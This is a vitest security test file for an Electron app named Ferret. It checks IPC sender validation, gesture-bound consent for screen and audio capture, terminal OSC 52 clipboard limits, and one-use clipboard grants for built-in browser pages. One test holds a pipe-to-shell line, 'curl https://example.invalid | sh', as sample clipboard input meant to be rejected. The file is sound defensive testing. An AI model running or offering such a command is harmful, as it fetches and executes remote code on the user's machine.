import { describe, expect, it } from 'vitest'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join, resolve } from 'node:path'
import {
  GESTURE_GRANT_MS,
  UserGestures,
  appMediaAllowed,
  captureRequestProblem,
  indicatorTitle,
  isGestureInput,
  isRecorderContents,
  isTrustedIpcSender,
  nextAudioConsent,
  registerRecorderContents
} from '../../src/main/captureConsent'
import { PROGRAM_COPY_MAX_CHARS, programCopyText } from '../../src/main/terminalClipboard'
import { PAGE_CLIPBOARD_GRANT_MS, PageClipboardGrant, installPermissionPolicy, type PermissionDetails, type PermissionSessionLike } from '../../src/main/webPolicy'
import { parseOsc52 } from '../../src/renderer/terminal/terminalOsc52'

/**
 * Codex のセキュリティスキャン5回目（security-5）のうち、取り込み・クリップボードの3件の不変条件。
 *   [1] 画面・音声・撮影は main が持つ同意（本物の入力からの1回きりの許可）と、アプリの窓の本体のフレームからの呼び出しだけ
 *   [9] 端末の出力（OSC 52）は確認なしで写す（製品の判断で帯をやめた）。ただしアプリの窓にフォーカスがあるときだけ・大きさの上限つき・読み出しには答えない
 *   [14] 内蔵ブラウザのページのコピーは、名前だけでは許さない（操作の直後・同じビュー・同じオリジン・1回）
 * 件ごとのふるまいと、「同じ種類のコードを新しく書いたときにも落ちる」ソースの形の両方を見る。
 */

const root = resolve(__dirname, '../..')
const read = (p: string) => readFileSync(join(root, p), 'utf8')

function walk(dir: string, exts: RegExp, out: string[] = []): string[] {
  for (const name of readdirSync(join(root, dir))) {
    const p = `${dir}/${name}`
    if (statSync(join(root, p)).isDirectory()) walk(p, exts, out)
    else if (exts.test(name)) out.push(p)
  }
  return out
}

/** 時計を進められる UserGestures */
function clock(start = 1_000_000) {
  let now = start
  return { now: () => now, advance: (ms: number) => { now += ms } }
}

const APP_URL = 'file:///Applications/Ferret.app/Contents/Resources/app.asar/out/renderer/index.html'
const isAppUrl = (url: string) => url.startsWith('file:///Applications/Ferret.app/Contents/Resources/app.asar/')

// ───────────────────────── [1] 取り込みの同意 ─────────────────────────

describe('security-5 [1] IPC is accepted only from the app window main frame', () => {
  const contents = { id: 1 }
  const main = { contents, mainFrame: { processId: 7, routingId: 1 } }

  it('accepts the main frame of the app window', () => {
    expect(isTrustedIpcSender({ sender: contents, senderFrame: { url: APP_URL, processId: 7, routingId: 1 } }, main, isAppUrl)).toBe(true)
  })

  it('rejects subframes, other webContents, non-app pages, missing frames and a missing window', () => {
    expect(isTrustedIpcSender({ sender: contents, senderFrame: { url: APP_URL, processId: 7, routingId: 2 } }, main, isAppUrl)).toBe(false)
    expect(isTrustedIpcSender({ sender: contents, senderFrame: { url: APP_URL, processId: 8, routingId: 1 } }, main, isAppUrl)).toBe(false)
    expect(isTrustedIpcSender({ sender: { id: 2 }, senderFrame: { url: APP_URL, processId: 7, routingId: 1 } }, main, isAppUrl)).toBe(false)
    expect(isTrustedIpcSender({ sender: contents, senderFrame: { url: 'https://evil.example/', processId: 7, routingId: 1 } }, main, isAppUrl)).toBe(false)
    expect(isTrustedIpcSender({ sender: contents, senderFrame: null }, main, isAppUrl)).toBe(false)
    expect(isTrustedIpcSender({ sender: contents, senderFrame: { url: APP_URL, processId: 7, routingId: 1 } }, null, isAppUrl)).toBe(false)
  })

  it('the IPC dispatcher checks the sender before running any handler', () => {
    const main = read('src/main/index.ts')
    const dispatch = main.slice(main.indexOf('ipcMain.handle(channel, async (event'))
    expect(dispatch.indexOf('isTrustedIpcSender(event')).toBeGreaterThan(0)
    expect(dispatch.indexOf('isTrustedIpcSender(event')).toBeLessThan(dispatch.indexOf('await run(...args)'))
    // アプリの IPC を登録するのはこの1か所だけ（ほかで ipcMain.handle を足すと、送り主の確認が抜ける）
    for (const file of walk('src/main', /\.ts$/)) {
      const count = (read(file).match(/ipcMain\.handle\(/g) ?? []).length
      expect(count, file).toBe(file === 'src/main/index.ts' ? 1 : 0)
    }
  })
})

describe('security-5 [1] capture needs a fresh one-use grant from a native gesture', () => {
  it('nothing is granted before a gesture', () => {
    const c = clock()
    const g = new UserGestures(c.now)
    for (const action of Object.keys(GESTURE_GRANT_MS) as Array<keyof typeof GESTURE_GRANT_MS>) expect(g.consume(action), action).toBe(false)
  })

  it('recording without a fresh grant fails, and one gesture starts at most one recording', () => {
    const c = clock()
    const g = new UserGestures(c.now)
    g.noteGesture()
    expect(g.consume('record')).toBe(true)
    expect(g.consume('record')).toBe(false)
    g.noteGesture()
    c.advance(GESTURE_GRANT_MS.record + 1)
    expect(g.consume('record')).toBe(false)
  })

  it('a screenshot grant is one-use and expires', () => {
    const c = clock()
    const g = new UserGestures(c.now)
    g.noteGesture()
    expect(g.consume('screenshot')).toBe(true)
    expect(g.consume('screenshot')).toBe(false)
    g.noteGesture()
    c.advance(GESTURE_GRANT_MS.screenshot + 1)
    expect(g.consume('screenshot')).toBe(false)
  })

  it('a gesture in the future (clock went back) grants nothing', () => {
    const c = clock()
    const g = new UserGestures(c.now)
    g.noteGesture()
    c.advance(-1000)
    expect(g.consume('record')).toBe(false)
  })

  it('only real input types count as gestures', () => {
    for (const type of ['mouseDown', 'rawKeyDown', 'keyDown', 'gestureTap', 'touchStart']) expect(isGestureInput(type), type).toBe(true)
    for (const type of ['mouseMove', 'mouseUp', 'keyUp', 'mouseWheel', 'char', 'mouseEnter']) expect(isGestureInput(type), type).toBe(false)
  })

  it('recording stays inside the target and sounds the user chose', () => {
    const screen = { kind: 'screen' as const, sourceId: 'screen:1:0', name: 'Screen 1' }
    const consent = { target: screen, mic: true, systemAudio: false }
    expect(captureRequestProblem({ target: { kind: 'browser' }, mic: true, systemAudio: false }, consent)).toBeNull()
    expect(captureRequestProblem({ target: screen, mic: true, systemAudio: false }, consent)).toBeNull()
    expect(captureRequestProblem({ target: { kind: 'window', sourceId: 'window:42:0', name: 'Mail' }, mic: true, systemAudio: false }, consent)).toBe('target')
    expect(captureRequestProblem({ target: { kind: 'screen', sourceId: 'screen:2:0', name: 'Screen 2' }, mic: true, systemAudio: false }, consent)).toBe('target')
    expect(captureRequestProblem({ target: screen, mic: true, systemAudio: true }, consent)).toBe('systemAudio')
    expect(captureRequestProblem({ target: screen, mic: true, systemAudio: false }, { ...consent, mic: false })).toBe('mic')
  })

  it('audio consent widens only right after a gesture; without one it can only narrow', () => {
    const current = { mic: false, systemAudio: false }
    expect(nextAudioConsent(current, { captureMic: true, captureSystemAudio: true }, false)).toEqual({ mic: false, systemAudio: false })
    expect(nextAudioConsent(current, { captureMic: true, captureSystemAudio: true }, true)).toEqual({ mic: true, systemAudio: true })
    expect(nextAudioConsent({ mic: true, systemAudio: true }, { captureSystemAudio: false }, false)).toEqual({ mic: true, systemAudio: false })
  })

  it('camera is denied by default; the app window gets audio only and video goes only to the recorder window', () => {
    const appWindow = (mediaTypes: string[]) => ({ request: true, mediaTypes, details: {} })
    expect(appMediaAllowed(appWindow(['video']), false)).toBe(false)
    expect(appMediaAllowed(appWindow(['audio', 'video']), false)).toBe(false)
    expect(appMediaAllowed(appWindow([]), false)).toBe(false)
    expect(appMediaAllowed(appWindow(['audio']), false)).toBe(true)
    expect(appMediaAllowed({ request: false, mediaTypes: [], details: { mediaType: 'video' } }, false)).toBe(false)
    expect(appMediaAllowed({ request: false, mediaTypes: [], details: { mediaType: 'audio' } }, false)).toBe(true)
    const recorder = {}
    expect(isRecorderContents(recorder)).toBe(false)
    registerRecorderContents(recorder)
    expect(isRecorderContents(recorder)).toBe(true)
    expect(isRecorderContents({})).toBe(false)
    expect(appMediaAllowed(appWindow(['video']), isRecorderContents(recorder))).toBe(true)
  })

  it('main shows its own recording indicator', () => {
    expect(indicatorTitle('acme-shop — Ferret', true)).toMatch(/^● acme-shop/)
    expect(indicatorTitle('acme-shop — Ferret', false)).toBe('acme-shop — Ferret')
  })

  it('every capture handler consumes a grant before touching pixels or devices', () => {
    const main = read('src/main/index.ts')
    const body = (channel: string, until: string) => {
      const start = main.indexOf(`'${channel}': `)
      expect(start, channel).toBeGreaterThan(0)
      const block = main.slice(start, main.indexOf(until, start))
      return block
    }
    const start = body('recording:start', 'controller.start(')
    expect(start).toMatch(/captureRequestProblem\(/)
    expect(start).toMatch(/gestures\.consume\('record'\)/)
    expect(start.indexOf("gestures.consume('record')")).toBeLessThan(start.indexOf('ensureRecording()'))
    const shot = body('feedback:captureWindow', 'capturePage()')
    expect(shot).toMatch(/gestures\.consume\('screenshot'\)/)
    expect(body('capture:sources', 'listCaptureSources(')).toMatch(/gestures\.consume\('sources'\)/)
    expect(body('capture:setTarget', 'updateSettings(')).toMatch(/gestures\.consume\('choice'\)/)
    // 同意を作るのは、窓に届いた本物の入力とメニューの操作だけ（renderer から呼べる道を作らない）
    expect((main.match(/gestures\.noteGesture\(\)/g) ?? []).length).toBe(2)
    expect(main).toMatch(/webContents\.on\('input-event', \(_event, input\) => \{ if \(isGestureInput\(input\.type\)\) gestures\.noteGesture\(\) \}\)/)
    expect(main).toMatch(/onCommand: \(command\) => \{ gestures\.noteGesture\(\); send\('menu:command', command\) \}/)
    expect(read('src/shared/ipc.ts')).not.toMatch(/gesture/i)
    // カメラ・画面の取り込みの許可は、アプリの窓には音だけ
    expect(main).toMatch(/query\.permission !== 'media' \|\| appMediaAllowed\(query, isRecorderContents\(query\.webContents\)\)/)
    expect(read('src/main/recording/recorderWindow.ts')).toMatch(/registerRecorderContents\(window\.webContents\)/)
  })

  it('pixels are captured only in the reviewed places', () => {
    const allowed: Record<string, RegExp> = {
      'src/main/index.ts': /capturePage/,
      'src/main/recording/stills.ts': /capturePage/,
      // 内蔵ブラウザのタブだけ。browser-use（Ferret のターミナルに渡した合言葉付きの CDP の口）の Page.captureScreenshot の代わりで、
      // その口では CDP の撮影そのものも使える（同じ範囲）。アプリの画面・ほかの窓は撮らない
      'src/main/browser.ts': /capturePage/,
      'src/main/recording/sources.ts': /desktopCapturer/,
      // 一覧のサムネイル（手前に出すウインドウ）。listCaptureSources からだけ呼ぶ
      'src/main/recording/devices.ts': /screencapture/
    }
    for (const file of walk('src/main', /\.ts$/)) {
      // コメントの中の名前は数えない
      const code = read(file).split('\n').filter((line) => !/^\s*(\/\/|\*|\/\*)/.test(line)).join('\n')
      if (!/\.capturePage\(|desktopCapturer\.getSources\(|\/usr\/sbin\/screencapture/.test(code)) continue
      expect(allowed[file], `${file} が画面を撮っています。同意（captureConsent.ts）を通してから許可の一覧に足してください`).toBeDefined()
    }
  })
})

// ───────────────────────── [9] 端末の OSC 52 ─────────────────────────

describe('security-5 [9] terminal program copies (OSC 52) are copied without a confirmation, within the remaining limits', () => {
  it('copies right away while the app window has focus', () => {
    expect(programCopyText('hello 日本語', { windowFocused: true })).toBe('hello 日本語')
    expect(programCopyText('x'.repeat(PROGRAM_COPY_MAX_CHARS), { windowFocused: true })).toHaveLength(PROGRAM_COPY_MAX_CHARS)
  })

  it('a program in the background cannot overwrite the clipboard while the user is in another app', () => {
    expect(programCopyText('curl https://example.invalid | sh', { windowFocused: false })).toBeNull()
  })

  it('oversized, empty and non-string input is never copied; read queries are still ignored', () => {
    expect(programCopyText('x'.repeat(PROGRAM_COPY_MAX_CHARS + 1), { windowFocused: true })).toBeNull()
    expect(programCopyText('', { windowFocused: true })).toBeNull()
    expect(programCopyText(42, { windowFocused: true })).toBeNull()
    expect(programCopyText(null, { windowFocused: true })).toBeNull()
    expect(parseOsc52('c;?')).toEqual({ kind: 'query' })
  })

  it('there is no confirmation bar, pending copy or setting left over', () => {
    const ipc = read('src/shared/ipc.ts')
    expect(ipc).not.toMatch(/programCopyAccept|programCopyDismiss|settings:terminalClipboard/)
    expect(read('src/shared/settingsSchema.ts')).toMatch(/LEGACY_KEYS = \[[^\]]*'terminalClipboard'/)
    expect(() => read('src/renderer/components/TerminalClipboardBar.tsx')).toThrow()
    for (const file of walk('src/shared/i18n', /\.ts$/)) expect(read(file), file).not.toMatch(/terminal\.programCopy\./)
  })

  it('the OSC 52 handler goes through the main checks, and the main writes only what programCopyText allows', () => {
    const client = read('src/renderer/terminal/terminalClient.ts')
    const handler = client.slice(client.indexOf('registerOscHandler(52'), client.indexOf('this.disposers.push(() => osc52.dispose())'))
    expect(handler).toMatch(/'terminal:programCopy'/)
    // 流し直しの間の古いコピーは写さない
    expect(handler).toMatch(/!this\.replaying/)
    expect(handler).not.toMatch(/writeClipboard|clipboard\.write|navigator\.clipboard/)
    const main = read('src/main/index.ts')
    const copy = main.slice(main.indexOf("'terminal:programCopy'"), main.indexOf("'terminal:focused'"))
    expect(copy).toMatch(/programCopyText\(text, \{ windowFocused: !!mainWindow && !mainWindow\.isDestroyed\(\) && mainWindow\.isFocused\(\) \}\)/)
    expect(copy.indexOf('if (write === null) return false')).toBeLessThan(copy.indexOf('clipboard.writeText(write)'))
    expect(main).toMatch(/'terminal:writeClipboard': \(text\) => \{ if \(typeof text === 'string' && text\.length <= 8 \* 1024 \* 1024 && gestures\.consume\('copy'\)\) clipboard\.writeText\(text\) \}/)
    // renderer に OS のクリップボードを書く別の道を作らない
    for (const file of walk('src/renderer', /\.tsx?$/)) expect(read(file), file).not.toMatch(/navigator\.clipboard\.write\w*\([^)]*osc/i)
  })
})

// ───────────────────────── [14] 内蔵ブラウザのコピー ─────────────────────────

describe('security-5 [14] reviewed pages get a one-use, gesture-bound, same-origin clipboard write', () => {
  const view = { id: 'view' }
  const popup = { id: 'popup' }
  const PAGE = 'https://shop.example/cart'
  const query = (over: Partial<{ permission: string; request: boolean; isMainFrame: boolean | undefined; origin: string; webContents: unknown }> = {}) =>
    ({ permission: 'clipboard-sanitized-write', request: true, isMainFrame: true, origin: PAGE, webContents: view, ...over })

  it('denies arbitrary origins and popups without a gesture', () => {
    const grant = new PageClipboardGrant()
    expect(grant.allow(query())).toBe(false)
    expect(grant.allow(query({ webContents: popup }))).toBe(false)
  })

  it('a trusted copy right after a gesture grants exactly one write', () => {
    const c = clock()
    const grant = new PageClipboardGrant(c.now)
    grant.noteGesture(view, PAGE)
    expect(grant.allow(query())).toBe(true)
    expect(grant.allow(query())).toBe(false)
  })

  it('popups, subframes, other origins, checks, reads and stale gestures are denied', () => {
    const c = clock()
    const grant = new PageClipboardGrant(c.now)
    const deny = (q: ReturnType<typeof query>) => {
      grant.noteGesture(view, PAGE)
      expect(grant.allow(q)).toBe(false)
    }
    deny(query({ webContents: popup }))
    deny(query({ isMainFrame: false }))
    deny(query({ isMainFrame: undefined }))
    deny(query({ origin: 'https://evil.example/frame' }))
    deny(query({ request: false }))
    deny(query({ permission: 'clipboard-read' }))
    grant.noteGesture(view, PAGE)
    c.advance(PAGE_CLIPBOARD_GRANT_MS + 1)
    expect(grant.allow(query())).toBe(false)
    // about:blank などオリジンの無いページには許さない
    grant.noteGesture(view, 'about:blank')
    expect(grant.allow(query({ origin: 'about:blank' }))).toBe(false)
  })

  it('through the session policy, read stays denied and write needs the gesture', () => {
    let request: Parameters<PermissionSessionLike['setPermissionRequestHandler']>[0] = null
    const ses: PermissionSessionLike = { setPermissionRequestHandler: (h) => { request = h }, setPermissionCheckHandler: () => undefined }
    const grant = new PageClipboardGrant()
    installPermissionPolicy(ses, (q) => grant.allow(q))
    const ask = (permission: string, details: PermissionDetails) => {
      let granted: boolean | null = null
      request!(view, permission, (g) => { granted = g }, details)
      return granted
    }
    expect(ask('clipboard-sanitized-write', { requestingUrl: PAGE, isMainFrame: true })).toBe(false)
    grant.noteGesture(view, PAGE)
    expect(ask('clipboard-read', { requestingUrl: PAGE, isMainFrame: true })).toBe(false)
    expect(ask('clipboard-sanitized-write', { requestingUrl: PAGE, isMainFrame: true })).toBe(true)
  })

  it('the browser session never allows a permission by name alone', () => {
    const browser = read('src/main/browser.ts')
    expect(browser).not.toMatch(/BROWSER_ALLOWED_PERMISSIONS/)
    expect(browser).toMatch(/\(query\) => pageClipboard\.allow\(query\) \|\| isTabCaptureRequest\(query\)/)
    // 同意はビュー自身に届いた本物の入力から（ポップアップの webContents では作らない）
    expect(browser).toMatch(/wc\.on\('input-event', \(_event, input\) => \{\n\s+if \(isGestureInput\(input\.type\)\) pageClipboard\.noteGesture\(wc, wc\.getURL\(\)\)/)
    expect((browser.match(/pageClipboard\.noteGesture\(/g) ?? []).length).toBe(1)
  })
})
